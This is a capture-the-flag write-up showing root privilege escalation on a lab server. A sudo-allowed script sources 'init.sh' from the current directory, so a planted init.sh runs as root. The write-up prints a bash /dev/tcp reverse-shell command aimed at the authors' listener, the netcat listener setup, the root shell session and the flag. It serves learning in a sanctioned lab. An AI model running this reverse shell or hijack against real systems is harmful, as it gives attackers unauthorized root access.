# Writeup
by fluffyhake

## Solution
By running a existing script called `hmadmin.sh` with a custom `init.sh` script we can execute any command as root. By doing this, we can open a reverse shell as root and locate the flag in the root home directory.

### Example
Target:
```
[prime@ip-10-128-2-180 ~]$ echo 'sh -i >& /dev/tcp/10.128.2.186/9001 0>&1' > /home/activemq/init.sh
[prime@ip-10-128-2-180 ~]$ sudo /opt/CSCOlumos/rcmds/hmadmin.sh  
sudo /opt/CSCOlumos/rcmds/hmadmin.sh  

```
Host listening for reverse shell:
```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.128.2.186] from (UNKNOWN) [10.128.2.180] 33236
sh-4.2# whoami
whoami
root

sh-4.2# cd
cd

sh-4.2# cat root.txt
cat root.txt
EPT{5b2f8f8681b6621b519ef09adf371174}
```



## Explanation
***Notice**: We did not manage to complete this challenge before the CTF finished. Huge shoutout to **loevland** who pointed us in the [right direction](https://discordapp.com/channels/888378227679195147/888388640550576128/1302357247527096371) after the CTF.*


This challenge is the continuation of Prime Time (user). In Prime Time (user) we get a reverse shell using a exploit in Apache ActiveMQ. 

After the initial exploit, we started to read about privilege escalation techniques. This lead us to try the `sudo -l` command.

We see that our user is permitted to run scripts in `/opt/CSCOlumos/rcmds/` as sudo.

```
[prime@ip-10-128-2-180 /]$ sudo -l
sudo -l
Matching Defaults entries for prime on ip-10-128-2-180:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User prime may run the following commands on ip-10-128-2-180:
    (ALL) SETENV: NOPASSWD: /opt/CSCOlumos/rcmds/
```

We poked around in this directory and actually looked at the script which could be used for exploitation (`hmadmin.sh`). But we did not manage to get further due to time. Thankfully, the infra is still up after the CTF (🙌🫶), so we can continue this challenge.

Looking through the scripts in `/opt/CSCOlumos/rcmds/`, we find `hmadmin.sh`, which looks like this:
```
[prime@ip-10-128-2-180 rcmds]$ cat hmadmin.sh
#!/bin/bash
. init.sh

$INSTALL_HOME/bin/hmadmin.sh

```

It executes `init.sh`, but does not do anything to restrict what folder we read `init.sh` from. 
Knowing this, we can create our own `init.sh` script in our home folder and run whatever we want as root.

We used [revshells.com](https://www.revshells.com/) to create a reverse shell command to put in `init.sh`. In addition, we used netcat on our EPT BOX to listen for a shell.

*Creating the init.sh file to open a reverse shell as root. `10.128.2.186` is the host we listen on*
```
[prime@ip-10-128-2-180 rcmds]$ echo 'sh -i >& /dev/tcp/10.128.2.186/9001 0>&1' > /home/activemq/init.sh
```
*Listening for the shell on our EPT BOX*
```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
```

Let's execute the payload by changing into our home folder with the custom `init.sh` script and running `/opt/CSCOlumos/rcmds/hmadmin.sh`
```
[prime@ip-10-128-2-180 rcmds]$ cd 
cd /home/activemq/
[prime@ip-10-128-2-180 ~]$ sudo /opt/CSCOlumos/rcmds/hmadmin.sh  
sudo /opt/CSCOlumos/rcmds/hmadmin.sh  


```
`hmadmin.sh` just read our local, custom, init.sh script and not the one in `/opt/CSCOlumos/rcmds/`!

We now see a shell connecting to our socket! 🎉
```
listening on [any] 9001 ...
connect to [10.128.2.186] from (UNKNOWN) [10.128.2.180] 33236
sh-4.2# whoami
whoami
root
```

We find a file called `root.txt` in root's home folder. It contains the flag. 
```
sh-4.2# ls
ls
init.sh
user.txt
sh-4.2# cd
cd
sh-4.2# ls
ls
root.txt
sh-4.2# cat root.txt
cat root.txt
EPT{5b2f8f8681b6621b519ef09adf371174}
```

This was our first time doing reverse shells and privilege escalation to pwn a server. Thanks to the EPT-team for this new experience and a fun challenge!